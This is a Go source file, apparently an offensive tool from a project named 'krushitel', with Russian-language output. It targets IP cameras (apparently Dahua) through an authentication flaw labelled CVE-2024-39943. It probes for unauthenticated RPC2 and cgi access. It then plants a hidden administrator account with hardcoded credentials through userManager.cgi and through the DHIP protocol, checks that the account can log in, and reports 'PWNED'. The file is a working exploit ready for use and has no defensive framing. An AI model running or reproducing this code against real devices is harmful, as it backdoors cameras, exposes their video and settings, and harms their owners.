package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"krushitel/core/dhip"
	"krushitel/core/fwd"
)

type dialer = dhip.Dialer

func httpClientOn(dial dialer, timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dial()
			},
		},
	}
}

func httpText(client *http.Client, method, urlStr, body string) (int, string, error) {
	var reader io.Reader
	if body != "" {
		reader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, urlStr, reader)
	if err != nil {
		return 0, "", err
	}
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	if err != nil {
		return resp.StatusCode, "", err
	}
	return resp.StatusCode, string(data), nil
}

func main() {
	serial := flag.String("serial", "", "серийник: туннель своим стеком fwd")
	host := flag.String("host", "127.0.0.1", "хост без туннеля (форвард/прямой)")
	httpPort := flag.Int("http", 80, "веб-порт камеры")
	dhipPort := flag.Int("dhip", 5000, "DHIP-порт камеры")
	user := flag.String("user", "krushitel", "dummy-логин")
	pass := flag.String("pass", "TancuiPantera1337", "dummy-пароль")
	flag.Parse()

	dhip.LogHook = func(format string, args ...any) {
		fmt.Printf("[DHIP] "+format+"\n", args...)
	}

	var httpDial, dhipDial dialer
	if *serial != "" {
		fmt.Printf("== туннель по серийнику %s (порты %d/%d)...\n", *serial, *httpPort, *dhipPort)
		f, err := fwd.Start(*serial, []fwd.PortSpec{
			{Local: 0, Remote: *httpPort},
			{Local: 0, Remote: *dhipPort},
		}, 0, "", "")
		if err != nil {
			fmt.Println("[-] туннель не встал:", err)
			os.Exit(1)
		}
		defer f.Stop()
		hp, dp := *httpPort, *dhipPort
		httpDial = func() (net.Conn, error) { return f.DialCamera(hp) }
		dhipDial = func() (net.Conn, error) { return f.DialCamera(dp) }
		fmt.Println("[+] туннель ок")
	} else {
		hp, dp := *httpPort, *dhipPort
		h := *host
		httpDial = func() (net.Conn, error) { return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", h, hp), 10*time.Second) }
		dhipDial = func() (net.Conn, error) { return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", h, dp), 10*time.Second) }
		fmt.Printf("== цель %s (http %d, dhip %d)\n", h, hp, dp)
	}

	verdict := ""

	fmt.Println("\n== [1/4] unauth probe (CVE-2024-39943)")
	client := httpClientOn(httpDial, 12*time.Second)
	probeBody := `{"method":"global.getCurrentTime","params":{},"id":1,"session":0}`
	code, text, err := httpText(client, "POST", "http://camera/RPC2", probeBody)
	probeOK := false
	if err != nil {
		fmt.Println("    RPC2 getCurrentTime: FAIL", err)
	} else {
		snippet := strings.ReplaceAll(text[:min(len(text), 160)], "\n", " ")
		fmt.Printf("    RPC2 getCurrentTime: HTTP %d, body: %s\n", code, snippet)
		if code == 200 && (strings.Contains(text, "result") || strings.Contains(text, "params")) {
			probeOK = true
		}
	}
	if !probeOK {
		code, text, err = httpText(client, "GET", "http://camera/cgi-bin/configManager.cgi?action=getConfig&name=General", "")
		if err != nil {
			fmt.Println("    cgi getConfig: FAIL", err)
		} else {
			snippet := strings.ReplaceAll(text[:min(len(text), 160)], "\n", " ")
			fmt.Printf("    cgi getConfig: HTTP %d, body: %s\n", code, snippet)
			if code == 200 && (strings.Contains(text, "table.General") || strings.Contains(text, "LocaleName")) {
				probeOK = true
			}
		}
	}
	if probeOK {
		fmt.Println("[+] ПРОБА: unauth-доступ подтверждён")
	} else {
		fmt.Println("[-] ПРОБА: оба зонда глухи — 39943 HTTP-транспортом не выглядит")
		verdict += "probe: deaf; "
	}

	fmt.Println("\n== [2/4] addUser через userManager.cgi (unauth)")
	q := url.Values{}
	q.Set("action", "addUser")
	q.Set("user.Name", *user)
	q.Set("user.Password", *pass)
	q.Set("user.Group", "admin")
	q.Set("user.Sharable", "true")
	q.Set("user.Reserved", "false")
	q.Set("user.AuthList", "Config|Info|Monitor_01|Playback_01")
	addURL := "http://camera/cgi-bin/userManager.cgi?" + q.Encode()
	code, text, err = httpText(client, "GET", addURL, "")
	cgiOK := false
	if err != nil {
		fmt.Println("    FAIL:", err)
	} else {
		body := strings.TrimSpace(text)
		if len(body) > 200 {
			body = body[:200]
		}
		fmt.Printf("    HTTP %d, ответ: %q\n", code, body)
		if strings.Contains(text, "OK") {
			cgiOK = true
		} else if strings.Contains(strings.ToLower(text), "exist") {
			fmt.Println("[!] юзер уже существует — переходим к верификации")
			cgiOK = true
		}
	}

	fmt.Println("\n== [3/4] верификация логином по DHIP", *dhipPort)
	verified := false
	for attempt := 1; attempt <= 2; attempt++ {
		err := dhip.VerifyLoginDial(dhipDial, *user, *pass, 25*time.Second)
		if err == nil {
			verified = true
			break
		}
		fmt.Printf("    попытка %d: %v\n", attempt, err)
		time.Sleep(2 * time.Second)
	}
	if verified {
		fmt.Printf("[+] ВЕРИФИКАЦИЯ: %s:%s логинится — 39943 HTTP РАБОТАЕТ\n", *user, *pass)
		verdict += "HTTP-путь: PWNED; "
	} else if cgiOK {
		fmt.Println("[!] addUser ответил OK, но логин не прошёл — юзер битый или вектор частичный")
		verdict += "HTTP-путь: add-ok/no-login; "
	} else {
		fmt.Println("[-] HTTP-путь не взял")
		verdict += "HTTP-путь: dead; "
	}

	fmt.Println("\n== [4/4] DHIP-транспорт: userManager.addUser с session 0")
	fanLogin, fanPass, ok := dhip.AddUser39943Fanout(dhipDial, *user, *pass)
	if ok {
		fmt.Printf("[+] DHIP-путь РАБОТАЕТ: посажен %s:%s\n", fanLogin, fanPass)
		verdict += fmt.Sprintf("DHIP-путь: PWNED (%s)", fanLogin)
	} else {
		fmt.Println("[-] DHIP-путь не взял (session 0 отвергнут или вектор мёртв)")
		verdict += "DHIP-путь: dead"
	}

	fmt.Println("\n== ВЕРДИКТ ==")
	fmt.Println(verdict)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
